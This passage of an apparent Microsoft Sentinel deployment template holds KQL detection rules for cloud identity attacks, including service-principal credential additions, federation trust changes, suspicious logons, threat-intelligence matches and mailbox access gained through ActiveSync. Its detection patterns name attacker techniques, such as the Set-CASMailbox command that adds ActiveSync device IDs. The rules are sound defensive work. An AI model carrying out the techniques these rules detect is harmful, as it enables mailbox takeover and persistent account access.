\"success\"\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"ServicePrincipal\"\n      | extend targetResourceName = tostring(TargetResource.displayName),\n               targetResourceID = tostring(TargetResource.id),\n               targetModifiedProp = TargetResource.modifiedProperties\n  )\n| mv-apply Property = targetModifiedProp on \n  (\n      where Property.displayName =~ \"KeyDescription\"\n      | extend Credential_TargetKeyDescription = trim(@'\"',tostring(Property.newValue))\n  )\n| mv-apply Property = targetModifiedProp on \n  (\n      where Property.displayName =~ \"Included Updated Properties\"\n      | extend UpdatedProperties = trim(@'\"',tostring(Property.newValue))\n  )\n| mv-apply Property = targetModifiedProp on \n  (\n      where Property.displayName =~ \"TargetId.ServicePrincipalNames\"\n      | extend Credential_TargetServicePrincipalNames = tostring(extract_all(@\"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})\",trim(@'\"',tostring(Property.newValue)))[0])\n  )\n| extend Credential_InitiatingUserOrApp = iff(isnotempty(InitiatedBy.user.userPrincipalName),tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))\n| extend Credential_InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend Credential_InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend Credential_InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend Credential_InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend Credential_InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n) on targetResourceName, targetResourceID\n| extend TimeConsent = TimeGenerated, TimeCred = TimeGenerated1\n| where TimeConsent < TimeCred \n| project TimeConsent, TimeCred, targetResourceName, targetResourceType, isAdminConsent, \nConsent_InitiatingUserOrApp, Consent_TargetServicePrincipalNames, Consent_TargetPermissions,\nConsent_InitiatingAppName, Consent_InitiatingAppServicePrincipalId, Consent_InitiatingUserPrincipalName, Consent_InitiatingAadUserId, Consent_InitiatingIpAddress,\nCredential_InitiatingUserOrApp, Credential_TargetServicePrincipalNames, Credential_TargetKeyDescription,\nCredential_InitiatingAppName, Credential_InitiatingAppServicePrincipalId, Credential_InitiatingUserPrincipalName, Credential_InitiatingAadUserId, Credential_InitiatingIpAddress\n| extend Consent_AccountName = tostring(split(Consent_InitiatingUserPrincipalName, \"@\")[0]), Consent_UPNSuffix = tostring(split(Consent_InitiatingUserPrincipalName, \"@\")[1])\n| extend Credential_AccountName = tostring(split(Credential_InitiatingUserPrincipalName, \"@\")[0]), Credential_UPNSuffix = tostring(split(Credential_InitiatingUserPrincipalName, \"@\")[1])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1555",
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "707494a5-8e44-486b-90f8-155d1797a8eb",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Consent_InitiatingAppName"
                },
                {
                  "identifier": "AadUserId",
                  "columnName": "Consent_InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Credential_InitiatingAppName"
                },
                {
                  "identifier": "AadUserId",
                  "columnName": "Credential_InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Consent_InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Consent_AccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "Consent_UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "Consent_InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Credential_InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Credential_AccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "Credential_UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "Credential_InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "Consent_InitiatingIpAddress"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "Credential_InitiatingIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2e5f983d-4f68-4136-beee-592f8689638d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2e5f983d-4f68-4136-beee-592f8689638d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Modified domain federation trust settings",
          "description": "This will alert when a user or application modifies the federation settings on the domain or Update domain authentication from Managed to Federated.\nFor example, this alert will trigger when a new Active Directory Federated Service (ADFS) TrustedRealm object, such as a signing certificate, is added to the domain.\nModification to domain federation settings should be rare. Confirm the added or modified target domain/URL is legitimate administrator behavior.\nTo understand why an authorized user may update settings for a federated domain in Office 365, Azure, or Intune, see: https://docs.microsoft.com/office365/troubleshoot/active-directory/update-federated-domain-office-365.\nFor details on security realms that accept security tokens, see the ADFS Proxy Protocol (MS-ADFSPP) specification: https://docs.microsoft.com/openspecs/windows_protocols/ms-adfspp/e7b9ea73-1980-4318-96a6-da559486664b.\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.",
          "severity": "High",
          "enabled": true,
          "query": "(union isfuzzy=true\n(\nAuditLogs\n| where OperationName =~ \"Set federation settings on domain\"\n//| where Result =~ \"success\"   // commenting out, as it may be interesting to capture failed attempts\n| mv-expand TargetResources\n| extend modifiedProperties = parse_json(TargetResources).modifiedProperties\n| mv-expand modifiedProperties\n| extend targetDisplayName = tostring(parse_json(modifiedProperties).displayName)\n),\n(\nAuditLogs\n| where OperationName =~ \"Set domain authentication\"\n//| where Result =~ \"success\"   // commenting out, as it may be interesting to capture failed attempts\n| mv-expand TargetResources\n| extend modifiedProperties = parse_json(TargetResources).modifiedProperties\n| mv-expand modifiedProperties\n| mv-apply Property = modifiedProperties on\n  (\n      where Property.displayName =~ \"LiveType\"\n      | extend targetDisplayName = tostring(Property.displayName),\n               NewDomainValue = tostring(Property.newValue)\n  )\n| where NewDomainValue has \"Federated\"\n)\n)\n| mv-apply AdditionalDetail = AdditionalDetails on\n  (\n      where AdditionalDetail.key =~ \"User-Agent\"\n      | extend UserAgent = tostring(AdditionalDetail.value)\n  )\n| extend InitiatingUserOrApp = iff(isnotempty(InitiatedBy.user.userPrincipalName),tostring(InitiatedBy.user.userPrincipalName), tostring(InitiatedBy.app.displayName))\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n| project-reorder TimeGenerated, OperationName, InitiatingUserOrApp, AADOperationType, targetDisplayName, Result, InitiatingIpAddress, UserAgent, CorrelationId, TenantId, AADTenantId\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1555",
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "95dc4ae3-e0f2-48bd-b996-cdd22b90f9af",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "InitiatingAppName"
                },
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatingAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatingAccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/40d6c883-3c85-4d46-806e-f719bd3fd2f2')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/40d6c883-3c85-4d46-806e-f719bd3fd2f2')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Successful logon from IP and failure from a different IP",
          "description": "Identifies when a user account successfully logs onto an Azure App from one IP and within 10 mins failed to logon to the same App via a different IP (may indicate a malicious attempt at password guessing with known account). \nUEBA added for context to gather all asoociated information assocaited with IP addressed initiating Faile Logon and affected user. \nPlease note, Failed logons from known IP ranges can be benign depending on the conditional access policies. In case of noisy behavior, consider tuning the source IP ranges after careful consideration",
          "severity": "Medium",
          "enabled": true,
          "query": "let riskScoreCutoff = 3; //Adjust this score threshold based on volume of results. Activities identified as the most abnormal receive the highest scores (on a scale of 0-10)\nlet logonDiff = 10m; \nlet aadFunc = (tableName:string)\n{ \ntable(tableName)\n| where ResultType == \"0\"\n| where AppDisplayName !in (\"Office 365 Exchange Online\", \"Skype for Business Online\") // To remove false-positives, add more Apps to this array\n// ---------- Fix for SuccessBlock to also consider IPv6\n| extend SuccessIPv6Block = strcat(split(IPAddress, \":\")[0], \":\", split(IPAddress, \":\")[1], \":\", split(IPAddress, \":\")[2], \":\", split(IPAddress, \":\")[3])\n| extend SuccessIPv4Block = strcat(split(IPAddress, \".\")[0], \".\", split(IPAddress, \".\")[1])\n// ------------------\n| project SuccessLogonTime = TimeGenerated, UserPrincipalName, SuccessIPAddress = IPAddress, SuccessLocation = Location, AppDisplayName, SuccessIPBlock = iff(IPAddress contains \":\", strcat(split(IPAddress, \":\")[0], \":\", split(IPAddress, \":\")[1]), strcat(split(IPAddress, \".\")[0], \".\", split(IPAddress, \".\")[1])), Type\n| join kind= inner (\n    table(tableName)\n    | where ResultType !in (\"0\", \"50140\")\n    | where ResultDescription !~ \"Other\"\n    | where AppDisplayName !in (\"Office 365 Exchange Online\", \"Skype for Business Online\")\n    | project FailedLogonTime = TimeGenerated, UserPrincipalName, FailedIPAddress = IPAddress, FailedLocation = Location, AppDisplayName, ResultType, ResultDescription, Type \n) on UserPrincipalName, AppDisplayName\n| where SuccessLogonTime < FailedLogonTime and FailedLogonTime - SuccessLogonTime <= logonDiff and FailedIPAddress !startswith SuccessIPBlock\n| summarize FailedLogonTime = max(FailedLogonTime), SuccessLogonTime = max(SuccessLogonTime) by UserPrincipalName, SuccessIPAddress, SuccessLocation, AppDisplayName, FailedIPAddress, FailedLocation, ResultType, ResultDescription, Type\n| extend timestamp = SuccessLogonTime\n| extend UserPrincipalName = tolower(UserPrincipalName)};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n| extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n// UEBA context below - make sure you have these 2 datatypes, otherwise the query will not work. If so, comment all that is below.\n| join kind=leftouter (\n    IdentityInfo\n    | summarize LatestReportTime = arg_max(TimeGenerated, *) by AccountUPN\n    | project AccountUPN, Tags, JobTitle, GroupMembership, AssignedRoles, UserType, IsAccountEnabled\n    | summarize\n        Tags = make_set(Tags, 1000),\n        GroupMembership = make_set(GroupMembership, 1000),\n        AssignedRoles = make_set(AssignedRoles, 1000),\n        UserType = make_set(UserType, 1000),\n        UserAccountControl = make_set(UserType, 1000)\n    by AccountUPN\n    | extend UserPrincipalName=tolower(AccountUPN)\n) on UserPrincipalName\n//Below it will be joined with BehaviorAnalytics table to the Failed IP Addresses\n| join kind=leftouter (\n    BehaviorAnalytics\n    | where ActivityType in (\"FailedLogOn\", \"LogOn\")\n    | where isnotempty(SourceIPAddress)\n    | project UsersInsights, DevicesInsights, ActivityInsights, InvestigationPriority, SourceIPAddress, UserName\n    | project-rename FailedIPAddress = SourceIPAddress, Name = UserName\n    | summarize\n        MaxInvestigationScore = max(InvestigationPriority)  // Only retrieve maximum Investigation Property score for both FailedIP and User\n    by FailedIPAddress, Name)\non FailedIPAddress, Name  // Joining on both IP and User so as to only return context associated with same user\n| extend UEBARiskScore = MaxInvestigationScore\n| project-away *1 // removing duplicate columns post outer join from output\n| where  UEBARiskScore > riskScoreCutoff\n| sort by UEBARiskScore desc\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "InitialAccess"
          ],
          "techniques": [
            "T1110",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "02ef8d7e-fc3a-4d86-a457-650fa571d8d2",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SuccessIPAddress"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "FailedIPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.1.11"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/98607098-fb9b-445e-bc35-23d64c112785')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/98607098-fb9b-445e-bc35-23d64c112785')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI Map IP Entity to W3CIISLog",
          "description": "This query maps any IP indicators of compromise (IOCs) from threat intelligence (TI), by searching for matches in W3CIISLog.",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h; // Look back 1 hour for W3CIISLog events\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\n// Fetch threat intelligence indicators related to IP addresses\nlet IP_Indicators = ThreatIntelligenceIndicator\n  | where isnotempty(NetworkIP) or isnotempty(EmailSourceIpAddress) or isnotempty(NetworkDestinationIP) or isnotempty(NetworkSourceIP)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | extend TI_ipEntity = iff(isnotempty(NetworkIP), NetworkIP, NetworkDestinationIP)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkSourceIP), NetworkSourceIP, TI_ipEntity)\n  | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(EmailSourceIpAddress), EmailSourceIpAddress, TI_ipEntity)\n  | where ipv4_is_private(TI_ipEntity) == false and TI_ipEntity !startswith \"fe80\" and TI_ipEntity !startswith \"::\" and TI_ipEntity !startswith \"127.\"\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now();\n// Perform a join between IP indicators and W3CIISLog events\nIP_Indicators\n  // Use innerunique to keep performance fast and result set low, as we only need one match to indicate potential malicious activity that needs investigation\n  | join kind=innerunique (\n      W3CIISLog\n      | where TimeGenerated >= ago(dt_lookBack)\n      | where isnotempty(cIP)\n      | where ipv4_is_private(cIP) == false and cIP !startswith \"fe80\" and cIP !startswith \"::\" and cIP !startswith \"127.\"\n      | extend W3CIISLog_TimeGenerated = TimeGenerated\n  )\n  on $left.TI_ipEntity == $right.cIP\n  // Filter out W3CIISLog events that occurred after the expiration of the corresponding indicator\n  | where W3CIISLog_TimeGenerated < ExpirationDateTime\n  // Group the results by IndicatorId and keep the W3CIISLog event with the latest timestamp\n  | summarize W3CIISLog_TimeGenerated = arg_max(W3CIISLog_TimeGenerated, *) by IndicatorId, cIP\n  // Select the desired output fields\n  | project timestamp = W3CIISLog_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore,\n    TI_ipEntity, Computer, sSiteName, cIP, sIP, sPort, csMethod, csUserName, scStatus, scSubStatus, scWin32Status,\n    NetworkIP, NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress, Type\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "5e45930c-09b1-4430-b2d1-cc75ada0dc0f",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "csUserName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "Computer"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "cIP"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.4.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/47b22929-a4f0-4fa0-997a-7a42e3e794f2')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/47b22929-a4f0-4fa0-997a-7a42e3e794f2')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI Map URL Entity to EmailUrlInfo",
          "description": "This query identifies any URL indicators of compromise (IOCs) from threat intelligence (TI) by searching for matches in EmailUrlInfo.",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet EmailUrlInfo_ = materialize(EmailUrlInfo\n    | where isnotempty(Url)\n    | where TimeGenerated >= ago(dt_lookBack)\n    | extend Url = tolower(Url)\n    | extend EmailUrlInfo_TimeGenerated = TimeGenerated);\nlet EmailUrls = EmailUrlInfo_ | distinct Url | summarize make_list(Url);\nlet EmailUrlDomains = EmailUrlInfo_ | distinct UrlDomain | summarize make_list(UrlDomain);\nlet EmailEvents_ = materialize(EmailEvents\n    | where TimeGenerated >= ago(dt_lookBack));\nlet TI = materialize(ThreatIntelligenceIndicator\n    | where TimeGenerated >= ago(ioc_lookBack)\n    | where (isnotempty(Url) or isnotempty(DomainName)) \n    | where tolower(Url) in (EmailUrls) or tolower(DomainName) in (EmailUrlDomains)\n    | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n    | where Active == true and ExpirationDateTime > now());\n(union\n    (TI | join kind=innerunique (EmailUrlInfo_) on Url),\n    (TI | join kind=innerunique (EmailUrlInfo_) on $left.DomainName == $right.UrlDomain))\n| where EmailUrlInfo_TimeGenerated < ExpirationDateTime\n| summarize EmailUrlInfo_TimeGenerated = arg_max(EmailUrlInfo_TimeGenerated, *) by IndicatorId, Url\n| project EmailUrlInfo_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, Url, UrlDomain, UrlLocation, NetworkMessageId\n| extend timestamp = EmailUrlInfo_TimeGenerated\n| join kind=inner (EmailEvents_) on NetworkMessageId\n| where DeliveryAction !has \"Blocked\"\n| extend Name = tostring(split(RecipientEmailAddress, '@', 0)[0]), UPNSuffix = tostring(split(RecipientEmailAddress, '@', 1)[0])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "a0038239-72f4-4f7b-90ff-37f89f7881e0",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "RecipientEmailAddress"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5fa0252b-6fe8-4996-811b-660d88129cc5')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5fa0252b-6fe8-4996-811b-660d88129cc5')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "VMware ESXi - Low patch disk space",
          "description": "This rule is triggered when low patch disk store space is detected.",
          "severity": "Medium",
          "enabled": false,
          "query": "let threshold = 100;\nVMwareESXi\n| where SyslogMessage has ('Patch store disk')\n| extend sp = toreal(extract(@'free space is:\\s(\\d+)', 1, SyslogMessage)) / 1000000000\n| where sp < threshold\n| extend h = 'Hypervisor'\n| extend HostCustomEntity = h\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/bd55471a-b6f1-4246-933f-75f08c176150')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/bd55471a-b6f1-4246-933f-75f08c176150')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Email access via active sync",
          "description": "This query detects attempts to add attacker devices as allowed IDs for active sync using the Set-CASMailbox command.\nThis technique was seen in relation to Solorigate attack but the results can indicate potential malicious activity used in different attacks.\n- Note that this query can be changed to use the KQL \"has_all\" operator, which hasn't yet been documented officially, but will be soon.\n  In short, \"has_all\" will only match when the referenced field has all strings in the list.\n- Refer to Set-CASMailbox syntax: https://docs.microsoft.com/powershell/module/exchange/set-casmailbox?view=exchange-ps",
          "severity": "Medium",
          "enabled": true,
          "query": "let timeframe = 1d;\nlet cmdList = dynamic([\"Set-CASMailbox\",\"ActiveSyncAllowedDeviceIDs\",\"add\"]);\n(union isfuzzy=true\n(\nSecurityEvent\n| where TimeGenerated >= ago(timeframe)\n| where EventID == 4688\n| where CommandLine has_all (cmdList)\n| project Type, TimeGenerated, Computer, Account, SubjectDomainName, SubjectUserName, Process, ParentProcessName, CommandLine\n| extend timestamp = TimeGenerated, AccountEntity = Account, HostEntity = Computer\n),\n( WindowsEvent\n| where TimeGenerated >= ago(timeframe)\n| where EventID == 4688\n| where EventData has_all (cmdList)\n| extend CommandLine = tostring(EventData.CommandLine) \n| where CommandLine has_all (cmdList)\n| extend Account =  strcat(tostring(EventData.SubjectDomainName),\"\\\\\", tostring(EventData.SubjectUserName))\n| extend SubjectUserName = tostring(EventData.SubjectUserName)\n| extend SubjectDomainName = tostring(EventData.SubjectDomainName)\n| extend NewProcessName = tostring(EventData.NewProcessName)\n| extend Process=tostring(split(NewProcessName, '\\\\')[-1])\n| extend ParentProcessName = tostring(EventData.ParentProcessName)\n| project Type, TimeGenerated, Computer, Account, SubjectDomainName, SubjectUserName, Process, ParentProcessName, CommandLine\n| extend timestamp = TimeGenerated, AccountEntity = Account, HostEntity = Computer\n),\n(\nDeviceProcessEvents\n| where TimeGenerated >= ago(timeframe)\n| where InitiatingProcessCommandLine has_all (cmdList)\n| project Type, TimeGenerated, DeviceName, AccountName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessParentFileName,  InitiatingProcessCommandLine\n| extend timestamp = TimeGenerated, AccountDomain = InitiatingProcessAccountDomain, AccountName = InitiatingProcessAccountName, HostEntity = DeviceName\n),\n(\nEvent\n| where TimeGenerated > ago(timeframe)\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 1\n| extend EventData = parse_xml(EventData).DataItem.EventData.Data\n| mv-expand bagexpansion=array EventData\n| evaluate bag_unpack(EventData)\n| extend Key=tostring(['@Name']), Value=['#text']\n| evaluate pivot(Key, any(Value), TimeGenerated, Source, EventLog, Computer, EventLevel, EventLevelName, EventID, UserName, RenderedDescription, MG, ManagementGroupName, Type, _ResourceId)\n| where TimeGenerated >= ago(timeframe)\n| where CommandLine has_all (cmdList)\n| extend Type = 